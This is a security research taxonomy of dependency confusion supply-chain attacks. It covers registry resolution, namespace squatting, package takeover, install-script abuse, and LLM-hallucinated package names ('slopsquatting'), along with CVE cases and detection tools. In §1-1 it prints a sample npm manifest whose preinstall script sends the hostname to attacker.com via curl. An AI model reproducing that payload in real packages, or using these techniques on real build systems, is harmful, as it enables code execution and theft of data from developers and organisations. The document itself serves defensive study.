# Dependency Confusion Mutation/Variation Taxonomy

---

## Classification Structure

Dependency confusion is a class of software supply chain attacks in which an attacker causes a build system, package manager, or developer environment to resolve a malicious package from an unintended source instead of the legitimate internal or private dependency. The fundamental exploit primitive is the **resolution ambiguity** inherent in how package managers select between multiple sources for a given package identifier. Since the original disclosure in February 2021 — which compromised build pipelines at Apple, Microsoft, Tesla, Uber, and PayPal — the attack surface has expanded dramatically across ecosystems, deployment architectures, and reconnaissance methods.

This taxonomy organizes the entire dependency confusion attack surface along three orthogonal axes:

- **Axis 1 — Substitution Mechanism (HOW):** The structural method by which a malicious package replaces a legitimate one. This is the primary axis and structures the main body of this document.
- **Axis 2 — Reconnaissance Vector (WHERE names are found):** How the attacker discovers internal/private package names eligible for confusion. This is a cross-cutting axis that enables all substitution mechanisms.
- **Axis 3 — Exploitation Scenario (WHAT the attacker achieves):** The weaponization context — what happens after the malicious package is installed. This maps techniques to real-world impact.

### Axis 2 Summary: Reconnaissance Vectors

| Vector | Description | Prevalence |
|--------|-------------|------------|
| **Manifest Leakage** | Internal `package.json`, `requirements.txt`, `pom.xml`, lockfiles exposed in public repos, CDN bundles, or client-side JS | Very High |
| **Build Artifact Inspection** | Webpack/Vite bundles, source maps, minified JS files containing embedded package references | High |
| **CI/CD Configuration Mining** | `.github/workflows/*.yml`, `Jenkinsfile`, `Dockerfile`, `docker-compose.yml` revealing internal dependencies | High |
| **Registry API Enumeration** | Querying public registries for 404s on suspected internal names; checking unclaimed npm org scopes | Medium |
| **Error Message Harvesting** | Build errors, stack traces, and logs exposed on public forums, issue trackers, or Slack channels | Medium |
| **LLM Hallucination (Slopsquatting)** | AI code assistants generate plausible but non-existent package names that developers install without verification | Emerging |
| **Social Engineering** | Targeted phishing or social engineering to extract internal package names from developers | Low |

### Axis 3 Summary: Exploitation Scenarios

| Scenario | Impact | Mechanism |
|----------|--------|-----------|
| **Remote Code Execution** | Critical | Lifecycle scripts (`preinstall`, `postinstall`, `setup.py`), native module compilation |
| **Data Exfiltration** | High | DNS callbacks, HTTP beacons collecting hostnames, environment variables, credentials |
| **Credential Harvesting** | High | Extraction of CI/CD secrets, API keys, cloud provider tokens from build environments |
| **Lateral Movement** | High | Pivot from build server to internal networks, cloud metadata endpoints |
| **Persistent Backdoor** | High | Injecting trojanized code into artifacts that propagate to production deployments |
| **Denial of Service** | Medium | Breaking build pipelines, introducing incompatible or crashing dependencies |
| **Intelligence Gathering** | Low | Passive data collection about internal infrastructure topology |

---

## §1. Registry Resolution Confusion

This is the classic and most prevalent category. It exploits the behavior of package managers when multiple registries (public and private) are configured simultaneously, and the resolution order or priority allows a public package to override a private one.

### §1-1. Version Priority Hijacking

The foundational technique: the attacker publishes a package to the public registry with the **same name** as a private/internal package but with a **higher version number**. When the package manager queries both public and private registries, it selects the higher version.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Semantic Version Escalation** | Attacker publishes version `99.0.0` or `999.0.0` to the public registry. Package managers configured to resolve "latest" or "highest matching" version pull the attacker's package. | No version pinning or exact version locking; package manager configured with both public and private sources |
| **Range Specifier Exploitation** | Dependencies declared with loose ranges (e.g., `^1.0.0`, `>=2.0.0`, `~3.2`) allow the attacker's higher version to satisfy the constraint. | Use of `^`, `~`, `>=`, `*` version specifiers without lockfile enforcement |
| **Pre-release Version Injection** | Attacker publishes a pre-release version (e.g., `2.0.0-alpha.1`) that may be resolved by package managers configured to include pre-release versions. | Package manager configured to accept pre-release versions or unstable channels |

**Example payload (npm `package.json`):**
```json
{
  "name": "internal-auth-service",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?h=$(hostname)"
  }
}
```

### §1-2. Registry Fallback Exploitation

When the primary (private) registry is unavailable, many package managers silently fall back to the public registry. The attacker waits for or induces this condition.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Private Registry Downtime Fallback** | Package manager is configured with a fallback chain: private → public. If the private registry returns an error or timeout, the public registry serves the malicious package. | Fallback/cascade configuration without strict source pinning |
| **VPN/Network Boundary Bypass** | Developers working outside the corporate network (e.g., remote, without VPN) cannot reach the private registry; the package manager falls back to the public source. | Private registry behind VPN; no explicit registry-only enforcement |
| **DNS Resolution Failure** | Temporary DNS issues prevent resolving the private registry hostname, triggering public registry fallback. | No certificate pinning or strict TLS verification on private registry connections |

### §1-3. Mixed Registry Configuration

Build environments commonly configure "virtual" or "aggregate" repositories that combine local/hosted and proxy/remote sources under a single endpoint. The resolution priority within these aggregations creates confusion windows.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Artifactory/Nexus Virtual Repository Merge** | Repository managers like JFrog Artifactory or Sonatype Nexus combine private and proxied-public repositories into a single virtual URL. Without explicit routing rules, attacker packages in the proxied public feed can shadow private packages. | Default virtual repository configuration without namespace routing rules |
| **pip `--extra-index-url` Merge** | Python's `pip` treats `--extra-index-url` as an additional source to check alongside PyPI. If both have a package by the same name, pip selects the higher version regardless of source. | Use of `--extra-index-url` instead of `--index-url` with `--no-deps` |
| **npm Multi-Registry Scope Misconfiguration** | When `.npmrc` configures multiple registries without scoped mapping, unscoped package names may resolve from the public registry instead of the private one. | Missing scope-to-registry mapping in `.npmrc` |
| **Maven Multi-Repository Priority** | Maven resolves dependencies by checking repositories in declaration order. If a public repository (Maven Central, JCenter) is declared before the private one, it takes precedence. | Repository declaration order in `pom.xml` or `settings.xml` favoring public sources |
| **Gradle Repository Chain** | Gradle checks repositories in order and uses the first match. A `mavenCentral()` declaration before the private repository allows public packages to take precedence. | `mavenCentral()` or `jcenter()` declared before internal repository in `build.gradle` |

---

## §2. Namespace and Scope Exploitation

This category targets the trust boundaries established by namespacing, scoping, and organizational identity within package registries.

### §2-1. Unclaimed Namespace Takeover

The attacker registers an unclaimed namespace, scope, or organization on the public registry and publishes packages under it.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **npm Organization Scope Squatting** | Applications reference scoped packages (e.g., `@company/utils`) but the `@company` organization is not registered on the public npm registry. The attacker registers the org and publishes malicious packages under that scope. | Organization scope referenced in code but not claimed on npmjs.com |
| **PyPI Namespace Gap** | PyPI lacks native namespace/scope support. Any user can publish a package with any name, including names that mimic internal naming conventions (e.g., `company-internal-utils`). | PyPI's flat namespace model with no organizational claiming |
| **Maven GroupId Domain Hijacking (MavenGate)** | Maven uses reversed domain names as GroupIds (e.g., `com.example.lib`). If the domain ownership lapses, an attacker can purchase the expired domain, prove ownership via DNS TXT record, and publish malicious artifacts under that GroupId. | Expired or abandoned domain used as Maven GroupId; repository allows domain-based verification |
| **NuGet Prefix Non-Reservation** | NuGet supports package prefix reservation, but many organizations fail to reserve their prefixes. Attackers can publish packages like `Company.Internal.Core` without restriction. | Organization has not reserved their package prefix on nuget.org |

### §2-2. Scope Boundary Confusion

Even when namespaces exist, ambiguity between scoped and unscoped package references creates confusion windows.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Scoped-to-Unscoped Fallback** | Internal code references `@scope/package`, but a build script or transitive dependency resolves the unscoped name `package` from the public registry. | Inconsistent scope usage across the dependency tree |
| **Sub-scope Collision** | The attacker creates packages under a similar but distinct scope (e.g., `@companyy/utils` vs. `@company/utils`) to exploit typos in configuration files. | Scope names not validated against visual similarity |
| **Cross-Registry Scope Inconsistency** | A package scope exists on one registry but not another. When migrating or adding registry sources, the unmapped scope resolves to the wrong source. | Multi-registry environments with inconsistent scope registrations |

---

## §3. Package Lifecycle Takeover

This category covers attacks that exploit the lifecycle of existing packages — abandoned, deleted, renamed, or transferred — rather than creating net-new confusion.

### §3-1. Abandoned Package Reclamation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Deleted Dependency Reclamation** | A dependency is deleted or unpublished from the public registry, but other packages still reference it. The attacker registers the now-available name and publishes a malicious replacement. (E.g., CVE-2025-27607: `msgspec-python313-pre` deleted from PyPI then reclaimed.) | Dependency deleted from registry; dependents not updated |
| **Archived Project Dependency** | An open-source project is archived or deprecated, but its internal or development dependencies remain unregistered on public registries. The attacker claims these orphaned names. (E.g., Apache archived projects with unclaimed pip packages.) | Project archived without dependency namespace cleanup |
| **Maintainer Account Expiry** | The original maintainer's account is tied to an expired email domain. The attacker purchases the domain, recovers the account, and publishes malicious updates. | Maintainer email on expired domain; no 2FA enabled |

### §3-2. Package Rename/Transfer Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Post-Rename Name Reclamation** | When a package is renamed (e.g., `torchtriton` → `pytorch-triton`), the old name becomes available. The attacker claims the old name and publishes a malicious package. Build systems still referencing the old name pull the attacker's version. | Package renamed without reserving old name as placeholder |
| **Repository Migration Gap** | An organization migrates between registry platforms (e.g., from self-hosted to cloud). During migration, the old namespace becomes claimable or the new configuration has gaps. | Registry platform migration without simultaneous namespace reservation |
| **CocoaPods Orphaned Pod Takeover** | CocoaPods' 2014 migration to the Trunk system left ~1,800 pods without owner verification. Attackers could claim these orphaned pods via the "Claim Your Pods" process and inject malicious code. (CVE-2024-38368, CVSS 9.3) | Pods migrated without ownership verification; legacy Trunk claiming process |

### §3-3. Source Repository Hijacking (RepoJacking)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **GitHub Username Reclamation** | A package references a GitHub repository for its source. If the maintainer renames their GitHub account, the old username becomes available. The attacker registers the old username and creates a repository with the same name, serving malicious code. | Package source URL references GitHub username that has been changed |
| **Domain-Based Source Hijacking** | Go modules and some other ecosystems use domain-based import paths (e.g., `example.com/pkg`). If the domain expires, the attacker purchases it and serves malicious module content. | Domain-based import paths with expired or transferable domains |
| **Git Tag/Branch Manipulation** | If the attacker gains write access to a referenced source repository (via account compromise or repo transfer), they can modify tags or branches to serve different content than originally intended. | Source repository with weak access controls; no commit hash pinning |

---

## §4. Package Manager Parser Differentials

This category covers attacks that exploit discrepancies between what the registry displays/validates and what the package manager actually installs and executes.

### §4-1. Manifest Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **npm Registry/Tarball Manifest Mismatch** | The npm registry does not validate that the `package.json` inside the published tarball matches the manifest metadata sent during publish. Attackers can publish a package whose registry listing shows benign metadata (no install scripts, few dependencies) while the actual tarball contains hidden `preinstall`/`postinstall` scripts and additional dependencies. | npm registry API design flaw (reported 2023, 800+ packages found with discrepancies) |
| **Metadata Field Injection** | Certain package manager metadata fields (description, homepage, keywords) are rendered in UIs without sanitization, allowing misleading information that disguises malicious packages as legitimate. | Registry UI rendering metadata without strict validation |

### §4-2. Installation Script Abuse

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Lifecycle Hook Exploitation (npm)** | Malicious code in `preinstall`, `install`, or `postinstall` scripts in `package.json` executes automatically during `npm install`. These hooks run with the same permissions as the installing user. | Default npm configuration allows lifecycle scripts; `--ignore-scripts` not enforced |
| **setup.py Execution (Python)** | Python's `setup.py` runs arbitrary code during `pip install`. Malicious `setup.py` can execute system commands, exfiltrate data, or install backdoors at install time. | pip installing from source distributions (sdist) without sandboxing |
| **Native Compilation Hooks** | Packages with native extensions (C/C++/Rust) execute build scripts during installation. These scripts can embed malicious operations within legitimate-looking compilation steps. | Packages requiring native compilation; build scripts not audited |
| **Post-Install Binary Replacement** | The malicious package installs a binary or script that shadows a legitimate tool on the system PATH, intercepting future invocations. | Package manager places binaries in PATH-accessible locations |

### §4-3. Transitive Dependency Injection

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Deep Transitive Confusion** | Rather than targeting a direct dependency, the attacker targets a transitive (indirect) dependency several levels deep, where auditing and version pinning are less rigorous. | Transitive dependencies not locked or audited; deep dependency trees |
| **Phantom Dependency Injection** | The malicious top-level package declares dependencies on packages that don't exist yet, then the attacker publishes those as well, creating a chain of malicious packages. | No pre-validation of dependency tree at install time |
| **Java Class Hijacking (Maven-Hijack)** | Exploits Java's classloading order within Maven dependency resolution. By publishing a package with the same GroupId:ArtifactId that appears earlier in the classpath, the attacker's classes shadow the legitimate ones. | Maven dependency ordering + Java classloader precedence |

---

## §5. Ecosystem-Specific Confusion Vectors

Each package ecosystem has unique architectural properties that create ecosystem-specific confusion opportunities beyond the general patterns above.

### §5-1. npm / Node.js

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unscoped Package Name Collision** | npm's original design uses a flat, global namespace for unscoped packages. Any user can publish any unscoped name not already taken. | Private packages using unscoped names not reserved on public npmjs.com |
| **`node_modules` Resolution Algorithm** | Node.js traverses parent directories looking for `node_modules`, potentially resolving a package from an unexpected directory level. | Monorepo or complex project structures with multiple `node_modules` trees |
| **pnpm/Yarn Plug'n'Play Edge Cases** | Alternative package managers with different resolution strategies may have unique edge cases where public packages are preferred over local ones in certain configurations. | Non-standard package manager configurations in mixed environments |

### §5-2. Python / pip

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`--extra-index-url` Priority Bug** | `pip install --extra-index-url` merges all sources and picks the highest version globally, regardless of source. This is the single most exploited dependency confusion vector in Python. | Any use of `--extra-index-url` without `--no-deps` and lockfile enforcement |
| **Naming Normalization Confusion** | PyPI normalizes package names (`-` → `_`, case insensitive). `my_package`, `my-package`, and `My_Package` all resolve to the same entry. Attackers exploit normalization edge cases. | Inconsistent naming between internal references and published packages |
| **`setup.py` vs. `pyproject.toml` Confusion** | Different installation backends (setuptools, flit, poetry) may resolve dependencies differently from the same specification, creating platform-dependent confusion. | Mixed build system usage across development and CI environments |

### §5-3. Maven / Gradle (JVM)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **GroupId Domain Verification Bypass (MavenGate)** | Maven Central requires GroupId to be a reversed domain name, but verification can be bypassed by purchasing expired domains or exploiting repositories that don't verify domain ownership. | Dependency on libraries from abandoned domain-based GroupIds |
| **Repository Declaration Order Exploitation** | Maven resolves dependencies from repositories in the order they're declared. Placing a public repo before the private one exposes all private package names to confusion. | `pom.xml` or `settings.xml` with public repositories declared first |
| **Gradle `mavenLocal()` Poisoning** | If `mavenLocal()` is in the repository list, an attacker with local access can place malicious artifacts in `~/.m2/repository/` to shadow remote dependencies. | `mavenLocal()` included in `build.gradle` repository list |
| **Cache Poisoning via Proxy** | Repository manager proxy caches can be poisoned if the proxied remote repository serves a malicious artifact. Once cached, the malicious artifact is served to all consumers. | Proxy repository caching without integrity verification |

### §5-4. NuGet / .NET

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`nuget.config` Multi-Source Default** | NuGet by default checks all configured sources and picks the highest version. Without Package Source Mapping, any configured source can serve any package name. | Pre-NuGet 6.0 configurations without Package Source Mapping |
| **Package Prefix Reservation Gap** | NuGet supports prefix reservation (e.g., `Company.*`) but it's opt-in. Unreserved prefixes allow anyone to publish packages with matching names. | Organization has not reserved prefixes on nuget.org |

### §5-5. Go Modules

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Module Proxy Confusion** | Go's module proxy (`proxy.golang.org`) caches modules based on their import path. If a vanity import domain expires, an attacker can serve different content through the same path. | Vanity import path domain expiry; `GOPRIVATE` not configured for internal modules |
| **`replace` Directive Manipulation** | The `go.mod` `replace` directive can redirect module resolution. If build environments process untrusted `go.mod` files, attackers can redirect dependencies. | Processing `go.mod` files from untrusted sources |

### §5-6. Container Registries (Docker/OCI)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Image Name Confusion** | Docker images referenced without a fully-qualified registry prefix default to Docker Hub. If internal images use unqualified names, builds may pull from Docker Hub instead of the private registry. | `FROM myimage:latest` without `registry.internal.com/` prefix |
| **Mirror Fallback Confusion** | Docker daemon configured with registry mirrors falls back to Docker Hub if the mirror is unavailable. An attacker publishes an image with the same name on Docker Hub. | Mirror/fallback configuration without strict pull-through policy |
| **Multi-Architecture Manifest Exploitation** | Multi-arch manifests can reference different image layers for different platforms. An attacker could publish a manifest where one platform variant contains malicious layers. | Automated multi-arch builds without per-platform verification |

### §5-7. Emerging: AI/LLM-Induced Confusion (Slopsquatting)

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **LLM Package Hallucination Squatting** | Code-generating LLMs (ChatGPT, Copilot, etc.) hallucinate plausible but non-existent package names in generated code. Attackers register these hallucinated names on public registries. Research shows 19.7% of LLM-generated packages are hallucinations. | Developers installing AI-suggested packages without verification |
| **Persistent Hallucination Exploitation** | Certain package names are hallucinated repeatedly across multiple models (>10% recurrence rate for 58% of hallucinated packages). Attackers target these high-recurrence names for maximum impact. | Consistent model behavior producing the same false package names |
| **Training Data Feedback Loop** | If hallucinated-then-registered malicious packages appear in code that enters LLM training data, future models may recommend the malicious packages with higher confidence. | LLM training on unvetted code repositories |

---

## §6. Build System and CI/CD Pipeline Exploitation

This category covers confusion techniques that specifically target automated build and deployment pipelines rather than developer workstations.

### §6-1. CI/CD Configuration Exploitation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Secrets-in-Environment Exposure** | CI/CD pipelines often inject secrets as environment variables. A confused dependency's install script runs in this context and can exfiltrate all environment variables, including cloud credentials, API keys, and signing certificates. | Secrets injected as environment variables during dependency installation phase |
| **Build Cache Poisoning** | The attacker's package installs successfully once and gets cached in CI/CD dependency caches (GitHub Actions cache, Docker layer cache). Even after the public package is removed, the cached malicious version persists. | CI/CD dependency caching without cache integrity verification |
| **Self-Hosted Runner Exploitation** | On self-hosted CI/CD runners (Jenkins, GitLab Runner), confused dependencies execute with the runner's system permissions, potentially accessing internal networks, shared filesystems, and other build jobs. | Self-hosted CI/CD runners without dependency sandboxing |

### §6-2. Monorepo and Workspace Confusion

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Workspace Hoisting Collision** | In monorepo setups (npm workspaces, Yarn workspaces, Lerna), dependencies are hoisted to the root `node_modules`. This can cause internal workspace packages to collide with or be replaced by public packages of the same name. | Monorepo workspace configuration with both public and private packages |
| **Lockfile Desync** | When lockfiles are not properly regenerated after configuration changes, stale entries may still reference public registry sources for packages that should now come from private registries. | Lockfile not regenerated after registry configuration changes |
| **Cross-Workspace Dependency Leak** | In monorepos, one workspace may inadvertently resolve a dependency from a sibling workspace's configuration, bypassing intended registry restrictions. | Complex monorepo with heterogeneous registry configurations per workspace |

---

## §7. Payload and Weaponization Techniques

After successful substitution, the attacker needs their malicious code to execute and achieve an objective. This category catalogs payload strategies.

### §7-1. Execution Triggers

| Subtype | Mechanism | Stealth Level |
|---------|-----------|--------------|
| **Install-Time Lifecycle Hooks** | `preinstall`/`postinstall` (npm), `setup.py` (pip), `.gemspec` extensions (Ruby). Execute immediately during package installation. | Low (easily auditable) |
| **Import-Time Code Execution** | Malicious code in `__init__.py` (Python), module entry point (Node.js), or static initializer (Java). Executes when the package is first imported/required. | Medium (executes only at runtime) |
| **Delayed/Conditional Execution** | Payload checks environment variables, hostnames, or time before executing, avoiding detection in sandboxed or analysis environments. | High (evades automated analysis) |
| **Native Binary Payload** | Compiled binary disguised as a native module extension. Harder to analyze than script payloads; may contain obfuscated C2 communication. | High (binary analysis required) |

### §7-2. Exfiltration Channels

| Subtype | Mechanism | Evasion Capability |
|---------|-----------|-------------------|
| **DNS Exfiltration** | Encode stolen data (hostnames, usernames, environment variables) into DNS query subdomains to attacker-controlled nameserver. Bypasses most firewalls since DNS is rarely blocked. | Very High |
| **HTTPS Callback** | POST stolen data to attacker-controlled HTTPS endpoint. Simple but blocked by strict egress firewalls. | Low-Medium |
| **DNS-over-HTTPS (DoH) Tunnel** | Use DoH resolvers to exfiltrate data, appearing as normal HTTPS traffic to content delivery networks. | High |
| **Package Registry as C2** | Publish exfiltrated data as metadata or version tags to a package registry the attacker controls, using the registry's API as a covert channel. | High |
| **Steganographic Embedding** | Hide exfiltrated data within seemingly legitimate build artifacts (images, fonts, compiled assets) that are later retrieved by the attacker. | Very High |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|----------|-------------|---------------------------|----------------|
| **Developer Workstation Compromise** | Developer runs `npm install`/`pip install` locally | §1-1, §2-1, §5-1 through §5-4 | RCE, credential theft, lateral movement |
| **CI/CD Pipeline Infiltration** | Automated build fetches dependencies in pipeline | §1-2, §1-3, §6-1, §6-2 | Secret exfiltration, artifact poisoning, persistent backdoor |
| **Production Deployment Poisoning** | Confused dependency deployed to production | §1-1, §3-1, §3-2, §4-3 | Backdoor in production, customer data exfiltration |
| **Container Image Supply Chain** | Docker build pulls confused base image or dependency | §5-6, §1-3 | Container escape, infrastructure compromise |
| **AI-Assisted Development Compromise** | Developer installs LLM-hallucinated package | §5-7 | RCE, data exfiltration, persistent backdoor |
| **Open-Source Ecosystem Poisoning** | Widely-used OSS library pulls confused transitive dep | §3-1, §4-3 | Mass compromise of downstream consumers |

---

## CVE / Bounty Mapping (2022–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §1-1 + §5-2 | **PyTorch `torchtriton`** (Dec 2022) | Malicious PyPI package exfiltrated hostnames, usernames, env vars, `/etc/passwd`. 3,000+ downloads before removal. |
| §3-2 (CocoaPods/Apple ecosystem) | **CVE-2024-38368** (CocoaPods, CVSS 9.3) | 1,800+ orphaned pods claimable via legacy "Claim Your Pods" process. 10-year exposure window (2014–2023). |
| §3-2 (CocoaPods/Apple ecosystem) | **CVE-2024-38366** (CocoaPods, CVSS 10.0) | Insecure email verification enabled arbitrary code execution on the CocoaPods Trunk server. |
| §3-2 (CocoaPods/Apple ecosystem) | **CVE-2024-38367** (CocoaPods, CVSS 8.2) | Session token theft via email verification redirect. |
| §2-1 + §5-3 | **MavenGate** (Jan 2024) | 18%+ of Maven dependencies interceptable via expired domain GroupId hijacking. 200+ affected companies notified. |
| §1-1 + §5-1 | **CVE-2024-29151** (Rocket.Chat) | Dependency `filecachetools` unclaimed on PyPI; RCE via dependency confusion in `requirements.txt`. |
| §3-1 | **CVE-2025-27607** (python-json-logger) | Deleted development dependency `msgspec-python313-pre` reclaimable on PyPI between Dec 2024–Mar 2025. |
| §4-1 | **npm Manifest Confusion** (Jul 2023) | 800+ packages with registry/tarball metadata mismatches; 18 packages actively exploiting the discrepancy. |
| §1-1 | **Alex Birsan Original Disclosure** (Feb 2021) | 35+ companies compromised (Apple, Microsoft, PayPal, Tesla, Uber, Shopify, Yelp). $130,000+ in bounties. PortSwigger Top 10 Web Hacking Techniques 2021 winner. |
| §2-1 + §5-1 | **Netflix Dependency Confusion** (Jun 2025) | RCE via unclaimed internal npm package discovered through headless browser JS analysis. |
| §1-1 + §5-1 | **$5,000 RCE Bounty** (2024) | RCE via dependency confusion in production environment; DNS exfiltration confirmed execution. |
| §1-1 + §5-1 | **$2,500 RCE Bounty** (2024) | Unclaimed npm package with `preinstall` script executing in production and non-production environments. |
| §5-7 | **`huggingface-cli` Slopsquatting** (2024) | LLM-hallucinated package published to PyPI; 30,000+ downloads in 3 months. Proof-of-concept for slopsquatting. |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Depfuzzer** (Offensive) | Multi-ecosystem | Automated fuzzing of dependency files to detect confusion-vulnerable package names |
| **Loki** (Offensive) | Multi-ecosystem | Dependency confusion scanner with git commit tracing for vulnerable package introduction |
| **Confused** (Offensive) | npm, pip, Maven | Checks if private package names exist on public registries |
| **repo-diff** (Defensive) | Nexus | Compares hosted and proxy repository contents for coordinate collisions |
| **Snyk** (Defensive) | Multi-ecosystem | SCA with dependency confusion detection in CI/CD pipelines |
| **Socket.dev** (Defensive) | npm, PyPI | Behavioral analysis of packages; detects install scripts, network calls, env access |
| **Sonatype Nexus Firewall** (Defensive) | Maven, npm, PyPI, NuGet | Namespace confusion protection via internal namespace allowlisting |
| **JFrog Xray** (Defensive) | Artifactory | Virtual repository routing rules and namespace pattern matching |
| **NuGet Package Source Mapping** (Defensive) | NuGet/.NET | Maps package ID patterns to specific sources in `nuget.config` |
| **npm audit** (Defensive) | npm | Analyzes installed packages for known vulnerabilities and suspicious scripts |
| **OWASP dep-scan** (Defensive) | Multi-ecosystem | Dependency audit including known CVEs and supply chain risk indicators |
| **Jsmon** (Reconnaissance) | npm/JavaScript | Scans JS files for invalid/unpublished npm module references; detects unclaimed org scopes |
| **GitGuardian** (Defensive) | Multi-ecosystem | Detects leaked internal package names in public repositories and code |

---

## Summary: Core Principles

### The Fundamental Property

Dependency confusion exists because **package identity in most ecosystems is based solely on name strings, not cryptographic identity**. A package named `internal-auth-lib` on a private registry and one with the same name on PyPI or npm are treated as the same logical entity by the resolution algorithm. This nominal equivalence — combined with resolution strategies that prefer higher versions or fall back to public sources — creates a structural confusion window that cannot be eliminated without fundamental changes to how packages are identified and trusted.

### Why Incremental Fixes Fail

Each ecosystem has responded with point solutions: npm added scopes, NuGet added Package Source Mapping, Maven relies on GroupId domain verification, Go uses checksums. Yet dependency confusion attacks continue because:

1. **Defenses are opt-in**: Scopes, prefix reservations, and source mappings must be actively configured. Default configurations remain vulnerable.
2. **The attack surface expands faster than defenses**: Slopsquatting, MavenGate, manifest confusion, and container registry confusion represent new vectors that existing defenses don't address.
3. **Legacy configurations persist**: Organizations with years of build infrastructure cannot easily migrate all dependencies to scoped/namespaced configurations.
4. **Reconnaissance is trivially easy**: Internal package names leak through JavaScript bundles, CI/CD configurations, error messages, and now LLM-generated code at massive scale.
5. **Human factors dominate**: Developers add dependencies without verifying sources; lockfiles are regenerated without auditing changes; VPN disconnections create silent fallback windows.

### Structural Solutions

A complete solution requires three architectural changes:

1. **Cryptographic package identity**: Packages should be identified by publisher signatures and content hashes, not by name strings. The package name becomes a human-readable label over a cryptographic identity, similar to how TLS certificates work for domains.
2. **Explicit source pinning by default**: Package managers should refuse to install packages from sources not explicitly declared in the project configuration. The fallback-to-public-registry pattern should be eliminated from default configurations.
3. **Registry-side namespace enforcement**: Public registries should implement mandatory namespace/scope ownership verification before allowing package publication, preventing name squatting of any kind.

Until these structural changes are adopted, dependency confusion will remain a persistent, high-impact supply chain attack vector.

---

## References

- Birsan, A. (2021). "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies." Medium.
- Oversecured Blog (2024). "Introducing MavenGate: a supply chain attack method for Java and Android applications."
- E.V.A Information Security (2024). "Vulnerabilities in CocoaPods Open the Door to Supply Chain Attacks."
- Clarke, D. (2023). "npm Manifest Confusion" — registry/tarball metadata validation bypass.
- Lanyado, B. et al. (2024). "We Have a Package for You! A Comprehensive Analysis of Package Hallucinations by Code Generating LLMs." arXiv:2406.10279.
- Liu, G. et al. (2022). "Exploring the Unchartered Space of Container Registry Typosquatting." USENIX Security.
- Ohm, M. et al. (2022). "Taxonomy of Attacks on Open-Source Software Supply Chains." arXiv:2204.04008.
- Synacktiv (2024). "Fuzzing confused dependencies with Depfuzzer."
- SLSA (2024). "Defender's Perspective: Dependency Confusion and Typosquatting Attacks."
- OWASP (2025). "MCP04:2025 – Software Supply Chain Attacks & Dependency Tampering."
- Socket.dev (2025). "Slopsquatting: How AI Hallucinations Are Fueling a New Class of Supply Chain Attacks."
- jsmon.sh (2025). "What is NPM Dependency Confusion? How Organisation Namespace Issues Lead to RCE."
- Microsoft .NET Blog. "Introducing Package Source Mapping."
- Phylum Research (2024). "Q2 2024 Evolution of Software Supply Chain Security Report."

---

*This document was created for defensive security research and vulnerability understanding purposes.*
